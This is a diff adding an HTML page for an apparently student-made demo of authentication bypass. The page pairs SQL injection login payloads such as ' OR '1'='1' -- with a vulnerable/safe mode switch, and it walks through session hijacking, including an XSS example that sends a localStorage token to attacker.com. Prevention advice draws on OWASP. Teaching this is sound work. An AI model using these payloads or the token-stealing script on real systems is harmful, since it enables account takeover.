@@ -1,0 +1,412 @@
+<!DOCTYPE html>
+<html lang="th">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Web Application Authentication Bypass Demo - SQL Injection & Session Hijacking">
+    <title>🔓 Auth Bypass Demo - PNRU</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;700&family=Noto+Sans+Thai:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <!-- Navigation -->
+    <nav class="navbar" id="navbar">
+        <div class="nav-container">
+            <a href="#" class="nav-logo" onclick="showPage('home')">
+                <i class="fas fa-shield-alt"></i>
+                <span>AuthBypass<span class="accent">Demo</span></span>
+            </a>
+            <div class="nav-links">
+                <a href="#" class="nav-link active" data-page="home"><i class="fas fa-home"></i> หน้าหลัก</a>
+                <a href="#" class="nav-link" data-page="demo-sqli"><i class="fas fa-syringe"></i> SQL Injection</a>
+                <a href="#" class="nav-link" data-page="demo-session"><i class="fas fa-cookie-bite"></i> Session Hijacking</a>
+                <a href="#" class="nav-link" data-page="logs"><i class="fas fa-clipboard-list"></i> Attack Logs</a>
+                <a href="#" class="nav-link" data-page="about"><i class="fas fa-book"></i> ทฤษฎี</a>
+            </div>
+            <button class="nav-toggle" onclick="document.querySelector('.nav-links').classList.toggle('show')">
+                <i class="fas fa-bars"></i>
+            </button>
+        </div>
+    </nav>
+
+    <!-- Toast -->
+    <div class="toast-container" id="toast-container"></div>
+
+    <!-- HOME PAGE -->
+    <main class="page active" id="page-home">
+        <section class="hero">
+            <div class="hero-particles" id="particles"></div>
+            <div class="hero-content">
+                <div class="hero-badge"><i class="fas fa-exclamation-triangle"></i> Educational Purpose Only</div>
+                <h1>Web Application<br><span class="gradient-text">Authentication Bypass</span></h1>
+                <p class="hero-subtitle">การข้ามระบบยืนยันตัวตนของ Web Application<br>สาธิต SQL Injection และ Session Hijacking แบบ Interactive</p>
+                <div class="hero-actions">
+                    <button class="btn btn-danger btn-lg pulse" onclick="showPage('demo-sqli')">
+                        <i class="fas fa-syringe"></i> ทดลอง SQL Injection
+                    </button>
+                    <button class="btn btn-warning btn-lg" onclick="showPage('demo-session')">
+                        <i class="fas fa-cookie-bite"></i> ทดลอง Session Hijacking
+                    </button>
+                </div>
+                <div class="hero-stats">
+                    <div class="stat-item"><div class="stat-number">SQL<br>Injection</div><div class="stat-label">Attack #1</div></div>
+                    <div class="stat-item"><div class="stat-number">Session<br>Hijack</div><div class="stat-label">Attack #2</div></div>
+                    <div class="stat-item"><div class="stat-number">TiDB</div><div class="stat-label">Cloud DB</div></div>
+                    <div class="stat-item"><div class="stat-number">PNRU</div><div class="stat-label">Project</div></div>
+                </div>
+            </div>
+        </section>
+
+        <section class="features">
+            <div class="container">
+                <h2 class="section-title">การโจมตีที่สาธิต</h2>
+                <div class="features-grid">
+                    <div class="feature-card danger">
+                        <div class="feature-icon"><i class="fas fa-syringe"></i></div>
+                        <h3>SQL Injection</h3>
+                        <p>ใส่ SQL Query พิเศษในช่อง Login เพื่อข้ามการตรวจสอบรหัสผ่าน ทำให้เข้าสู่ระบบได้โดยไม่ต้องรู้รหัสผ่าน</p>
+                        <code class="payload-preview">' OR '1'='1' --</code>
+                    </div>
+                    <div class="feature-card warning">
+                        <div class="feature-icon"><i class="fas fa-cookie-bite"></i></div>
+                        <h3>Session Hijacking</h3>
+                        <p>ขโมย JWT Token จาก localStorage แล้วนำไปใช้ในเบราว์เซอร์อื่น เพื่อปลอมตัวเป็นผู้ใช้คนอื่น</p>
+                        <code class="payload-preview">localStorage.getItem('token')</code>
+                    </div>
+                    <div class="feature-card success">
+                        <div class="feature-icon"><i class="fas fa-shield-alt"></i></div>
+                        <h3>การป้องกัน</h3>
+                        <p>เรียนรู้วิธีป้องกันด้วย Parameterized Query, bcrypt, httpOnly Cookie และ CSRF Token</p>
+                        <code class="payload-preview">Prepared Statements</code>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <section class="tech-stack">
+            <div class="container">
+                <h2 class="section-title">Technology Stack</h2>
+                <div class="tech-grid">
+                    <div class="tech-item"><i class="fas fa-globe"></i><span>Vercel</span><small>Frontend</small></div>
+                    <div class="tech-item"><i class="fas fa-server"></i><span>Render</span><small>Backend</small></div>
+                    <div class="tech-item"><i class="fas fa-database"></i><span>TiDB Cloud</span><small>Database</small></div>
+                    <div class="tech-item"><i class="fab fa-node-js"></i><span>Node.js</span><small>Runtime</small></div>
+                    <div class="tech-item"><i class="fas fa-code"></i><span>Express</span><small>API</small></div>
+                    <div class="tech-item"><i class="fas fa-key"></i><span>JWT</span><small>Auth</small></div>
+                </div>
+            </div>
+        </section>
+    </main>
+
+    <!-- SQL INJECTION DEMO PAGE -->
+    <main class="page" id="page-demo-sqli">
+        <section class="demo-section">
+            <div class="container">
+                <div class="demo-header">
+                    <div class="demo-badge danger"><i class="fas fa-syringe"></i> SQL Injection Demo</div>
+                    <h2 class="section-title">🔓 SQL Injection Attack</h2>
+                    <p>ทดลองใส่ SQL Injection payload ในช่อง Login เพื่อข้ามการยืนยันตัวตน</p>
+                </div>
+
+                <div class="demo-layout">
+                    <!-- Login Form -->
+                    <div class="demo-panel">
+                        <div class="panel-header">
+                            <h3><i class="fas fa-sign-in-alt"></i> Login Form</h3>
+                            <div class="mode-switch">
+                                <button class="mode-btn active" id="btn-mode-vuln" onclick="setMode('vulnerable')">
+                                    <i class="fas fa-unlock"></i> Vulnerable
+                                </button>
+                                <button class="mode-btn" id="btn-mode-safe" onclick="setMode('safe')">
+                                    <i class="fas fa-lock"></i> Safe
+                                </button>
+                            </div>
+                        </div>
+                        <form id="sqli-form" onsubmit="handleSQLiLogin(event)">
+                            <div class="form-group">
+                                <label><i class="fas fa-user"></i> Username</label>
+                                <input type="text" id="sqli-username" placeholder="กรอกชื่อผู้ใช้" autocomplete="off">
+                            </div>
+                            <div class="form-group">
+                                <label><i class="fas fa-lock"></i> Password</label>
+                                <input type="text" id="sqli-password" placeholder="กรอกรหัสผ่าน" autocomplete="off">
+                            </div>
+                            <button type="submit" class="btn btn-danger btn-full" id="btn-sqli-login">
+                                <i class="fas fa-sign-in-alt"></i> เข้าสู่ระบบ
+                            </button>
+                        </form>
+
+                        <div class="quick-payloads">
+                            <h4><i class="fas fa-bolt"></i> Quick Payloads (คลิกเพื่อใส่อัตโนมัติ)</h4>
+                            <div class="payload-buttons">
+                                <button class="payload-btn" onclick="fillPayload(`' OR '1'='1' -- `, `anything`)">
+                                    <code>' OR '1'='1' --</code>
+                                </button>
+                                <button class="payload-btn" onclick="fillPayload(`admin' -- `, `anything`)">
+                                    <code>admin' --</code>
+                                </button>
+                                <button class="payload-btn" onclick="fillPayload(`' OR 1=1 -- `, `x`)">
+                                    <code>' OR 1=1 --</code>
+                                </button>
+                                <button class="payload-btn" onclick="fillPayload(`admin`, `admin123`)">
+                                    <code>admin / admin123 (ปกติ)</code>
+                                </button>
+                            </div>
+                        </div>
+
+                        <div class="demo-users-info">
+                            <h4><i class="fas fa-users"></i> Demo Users</h4>
+                            <table class="mini-table">
+                                <tr><th>Username</th><th>Password</th><th>Role</th></tr>
+                                <tr><td>admin</td><td>admin123</td><td>admin</td></tr>
+                                <tr><td>user1</td><td>password123</td><td>user</td></tr>
+                                <tr><td>john</td><td>john2026</td><td>user</td></tr>
+                            </table>
+                        </div>
+                    </div>
+
+                    <!-- Result Panel -->
+                    <div class="demo-panel result-panel">
+                        <h3><i class="fas fa-terminal"></i> ผลลัพธ์</h3>
+                        <div class="result-box" id="sqli-result">
+                            <div class="result-placeholder">
+                                <i class="fas fa-arrow-left"></i>
+                                <p>กรอกข้อมูลและกด Login เพื่อดูผลลัพธ์</p>
+                            </div>
+                        </div>
+
+                        <div class="query-box" id="sqli-query" style="display:none;">
+                            <h4><i class="fas fa-database"></i> SQL Query ที่ถูกส่งไป</h4>
+                            <pre id="sqli-query-text"></pre>
+                        </div>
+
+                        <div class="explanation-box" id="sqli-explanation" style="display:none;">
+                            <h4><i class="fas fa-graduation-cap"></i> คำอธิบาย</h4>
+                            <div id="sqli-explanation-text"></div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- How it works -->
+                <div class="how-it-works">
+                    <h3><i class="fas fa-cogs"></i> SQL Injection ทำงานอย่างไร?</h3>
+                    <div class="steps-grid">
+                        <div class="step-card">
+                            <div class="step-num">1</div>
+                            <h4>Query ปกติ</h4>
+                            <code>SELECT * FROM users WHERE username = 'admin' AND password = 'pass123'</code>
+                            <p>ค้นหา user ที่ username เป็น admin และ password ตรง</p>
+                        </div>
+                        <div class="step-card">
+                            <div class="step-num">2</div>
+                            <h4>Inject Payload</h4>
+                            <code>SELECT * FROM users WHERE username = '' OR '1'='1' -- ' AND password = 'x'</code>
+                            <p>เงื่อนไข OR '1'='1' เป็นจริงเสมอ, -- ทำให้ส่วนที่เหลือเป็น comment</p>
+                        </div>
+                        <div class="step-card">
+                            <div class="step-num">3</div>
+                            <h4>ผลลัพธ์</h4>
+                            <code>✅ Query คืนค่า user ทั้งหมด → Login สำเร็จ!</code>
+                            <p>ผู้โจมตีเข้าสู่ระบบได้โดยไม่ต้องรู้รหัสผ่าน</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+    </main>
+
+    <!-- SESSION HIJACKING DEMO PAGE -->
+    <main class="page" id="page-demo-session">
+        <section class="demo-section">
+            <div class="container">
+                <div class="demo-header">
+                    <div class="demo-badge warning"><i class="fas fa-cookie-bite"></i> Session Hijacking Demo</div>
+                    <h2 class="section-title">🍪 Session Hijacking Attack</h2>
+                    <p>สาธิตการขโมย JWT Token จาก localStorage เพื่อปลอมตัวเป็นผู้ใช้คนอื่น</p>
+                </div>
+
+                <div class="demo-layout">
+                    <div class="demo-panel">
+                        <h3><i class="fas fa-user-secret"></i> Step 1: เข้าสู่ระบบก่อน</h3>
+                        <form id="session-login-form" onsubmit="handleSessionLogin(event)">
+                            <div class="form-group">
+                                <label>Username</label>
+                                <input type="text" id="session-username" value="admin" placeholder="admin">
+                            </div>
+                            <div class="form-group">
+                                <label>Password</label>
+                                <input type="text" id="session-password" value="admin123" placeholder="admin123">
+                            </div>
+                            <button type="submit" class="btn btn-primary btn-full">
+                                <i class="fas fa-sign-in-alt"></i> เข้าสู่ระบบ (เหยื่อ)
+                            </button>
+                        </form>
+
+                        <div class="token-display" id="token-display" style="display:none;">
+                            <h4><i class="fas fa-key"></i> JWT Token ที่ได้</h4>
+                            <div class="token-box">
+                                <code id="token-value"></code>
+                                <button class="btn btn-sm btn-outline" onclick="copyToken()">
+                                    <i class="fas fa-copy"></i> Copy
+                                </button>
+                            </div>
+                            <p class="token-warning">
+                                <i class="fas fa-exclamation-triangle"></i>
+                                Token นี้ถูกเก็บใน <code>localStorage</code> — XSS attack สามารถขโมยได้!
+                            </p>
+                        </div>
+
+                        <div id="hijack-section" style="display:none;">
+                            <h3><i class="fas fa-user-ninja"></i> Step 2: สวมรอยเป็นผู้โจมตี</h3>
+                            <p>ผู้โจมตีนำ Token ที่ขโมยมาใช้ดึงข้อมูลโปรไฟล์ของเหยื่อ</p>
+                            <div class="form-group">
+                                <label>Stolen Token</label>
+                                <input type="text" id="stolen-token" placeholder="วาง Token ที่ขโมยมา">
+                            </div>
+                            <button class="btn btn-danger btn-full" onclick="hijackSession()">
+                                <i class="fas fa-user-ninja"></i> ใช้ Token ขโมยดึงข้อมูล
+                            </button>
+                        </div>
+                    </div>
+
+                    <div class="demo-panel result-panel">
+                        <h3><i class="fas fa-terminal"></i> ผลลัพธ์</h3>
+                        <div class="result-box" id="session-result">
+                            <div class="result-placeholder">
+                                <i class="fas fa-arrow-left"></i>
+                                <p>เข้าสู่ระบบก่อน แล้วลองขโมย Token</p>
+                            </div>
+                        </div>
+
+                        <div class="explanation-box" id="session-explanation" style="display:none;">
+                            <h4><i class="fas fa-graduation-cap"></i> วิธีป้องกัน Session Hijacking</h4>
+                            <div class="prevention-list">
+                                <div class="prevent-item">
+                                    <i class="fas fa-check-circle"></i>
+                                    <div><strong>httpOnly Cookie</strong><br>ใช้ Cookie แทน localStorage เพื่อป้องกัน XSS ขโมย Token</div>
+                                </div>
+                                <div class="prevent-item">
+                                    <i class="fas fa-check-circle"></i>
+                                    <div><strong>Secure Flag</strong><br>ส่ง Cookie เฉพาะผ่าน HTTPS เท่านั้น</div>
+                                </div>
+                                <div class="prevent-item">
+                                    <i class="fas fa-check-circle"></i>
+                                    <div><strong>SameSite Cookie</strong><br>ป้องกัน CSRF attack</div>
+                                </div>
+                                <div class="prevent-item">
+                                    <i class="fas fa-check-circle"></i>
+                                    <div><strong>Token Rotation</strong><br>เปลี่ยน Token ทุกครั้งที่ใช้งาน</div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+    </main>
+
+    <!-- ATTACK LOGS PAGE -->
+    <main class="page" id="page-logs">
+        <section class="logs-section">
+            <div class="container">
+                <h2 class="section-title"><i class="fas fa-clipboard-list"></i> Attack Logs</h2>
+                <p>บันทึกการโจมตีทั้งหมดที่เกิดขึ้นบนระบบ</p>
+                <button class="btn btn-primary" onclick="loadAttackLogs()"><i class="fas fa-sync"></i> โหลดข้อมูล</button>
+                <div class="logs-table-wrap">
+                    <table class="logs-table" id="logs-table">
+                        <thead><tr><th>ID</th><th>ประเภท</th><th>Payload</th><th>ผลลัพธ์</th><th>IP</th><th>เวลา</th></tr></thead>
+                        <tbody id="logs-tbody"><tr><td colspan="6" class="text-center">กดปุ่มโหลดข้อมูลเพื่อดู logs</td></tr></tbody>
+                    </table>
+                </div>
+            </div>
+        </section>
+    </main>
+
+    <!-- ABOUT/THEORY PAGE -->
+    <main class="page" id="page-about">
+        <section class="about-section">
+            <div class="container">
+                <h2 class="section-title"><i class="fas fa-book"></i> ทฤษฎี Authentication Bypass</h2>
+
+                <div class="theory-grid">
+                    <div class="theory-card">
+                        <h3><i class="fas fa-syringe"></i> SQL Injection คืออะไร?</h3>
+                        <p>SQL Injection เป็นเทคนิคการโจมตีที่ผู้โจมตีใส่ SQL code ลงในช่องกรอกข้อมูล (เช่น Login form) เพื่อเปลี่ยนแปลง SQL Query ที่ server ส่งไปยัง database</p>
+                        <div class="theory-example">
+                            <h4>ตัวอย่าง:</h4>
+                            <pre>-- Query ปกติ
+SELECT * FROM users 
+WHERE username = 'admin' AND password = 'pass'
+
+-- Query ที่ถูก Inject
+SELECT * FROM users 
+WHERE username = '' OR '1'='1' -- ' AND password = 'x'
+-- เงื่อนไข '1'='1' เป็นจริงเสมอ → คืน user ทุกคน!</pre>
+                        </div>
+                        <div class="theory-prevention">
+                            <h4><i class="fas fa-shield-alt"></i> วิธีป้องกัน:</h4>
+                            <ul>
+                                <li>ใช้ <strong>Parameterized Query</strong> / Prepared Statements</li>
+                                <li>ใช้ <strong>ORM</strong> (Object-Relational Mapping)</li>
+                                <li>ทำ <strong>Input Validation</strong></li>
+                                <li>ใช้ <strong>Least Privilege</strong> สำหรับ DB user</li>
+                            </ul>
+                        </div>
+                    </div>
+
+                    <div class="theory-card">
+                        <h3><i class="fas fa-cookie-bite"></i> Session Hijacking คืออะไร?</h3>
+                        <p>Session Hijacking เป็นการขโมย Session ID หรือ Token ของผู้ใช้ที่ login แล้ว เพื่อปลอมตัวเป็นผู้ใช้คนนั้น โดยไม่ต้องรู้รหัสผ่าน</p>
+                        <div class="theory-example">
+                            <h4>วิธีการโจมตี:</h4>
+                            <pre>// 1. XSS Attack - ขโมย Token จาก localStorage
+&lt;script&gt;
+  fetch('https://attacker.com/steal?token=' 
+    + localStorage.getItem('token'))
+&lt;/script&gt;
+
+// 2. Man-in-the-Middle (HTTP ไม่เข้ารหัส)
+// 3. Session Fixation
+// 4. Packet Sniffing (WiFi สาธารณะ)</pre>
+                        </div>
+                        <div class="theory-prevention">
+                            <h4><i class="fas fa-shield-alt"></i> วิธีป้องกัน:</h4>
+                            <ul>
+                                <li>ใช้ <strong>httpOnly Cookie</strong> แทน localStorage</li>
+                                <li>บังคับ <strong>HTTPS</strong> ทุก connection</li>
+                                <li>ใช้ <strong>SameSite Cookie</strong></li>
+                                <li>ทำ <strong>Token Rotation</strong></li>
+                                <li>ตั้ง <strong>Token Expiry</strong> ที่สั้น</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="reference-section">
+                    <h3><i class="fas fa-link"></i> อ้างอิง</h3>
+                    <ul>
+                        <li><a href="https://owasp.org/www-community/attacks/SQL_Injection" target="_blank">OWASP - SQL Injection</a></li>
+                        <li><a href="https://owasp.org/www-community/attacks/Session_hijacking_attack" target="_blank">OWASP - Session Hijacking</a></li>
+                        <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html" target="_blank">OWASP Authentication Cheat Sheet</a></li>
+                    </ul>
+                </div>
+            </div>
+        </section>
+    </main>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="container">
+            <div class="footer-content">
+                <div class="footer-brand"><i class="fas fa-shield-alt"></i> AuthBypassDemo</div>
+                <p>Web Application Authentication Bypass — PNRU Project</p>
+                <p class="footer-tech">Vercel + Render + TiDB Cloud</p>
+            </div>
+        </div>
+    </footer>
+
+    <script src="app.js"></script>
+</body>
+</html>
